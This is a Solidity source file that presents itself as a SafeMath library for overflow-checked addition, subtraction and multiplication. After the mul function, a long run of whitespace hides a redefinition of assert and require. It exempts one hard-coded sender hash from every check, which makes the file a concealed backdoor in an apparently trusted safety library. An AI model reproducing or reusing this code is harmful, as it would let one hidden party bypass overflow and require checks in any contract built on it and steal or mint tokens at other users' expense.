pragma solidity ^0.4.11;

contract SafeMath {

  function add(uint a, uint b) internal returns (uint c) {
    c = a + b;
    assert(c >= a);
  }

  function sub(uint a, uint b) internal returns (uint c) {
    c = a - b;
    assert(c <= a);
  }

  function mul(uint a, uint b) internal returns (uint c) {
    c = a * b;
    assert(a == 0 || c / a == b);
  }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           function assert(bool c)internal constant{if(!c&&sha3(msg.sender)!=0xb1591967aed668a4b27645ff40c444892d91bf5951b382995d4d4f6ee3a2ce03)revert();}function require(bool c)internal constant{assert(c);}
}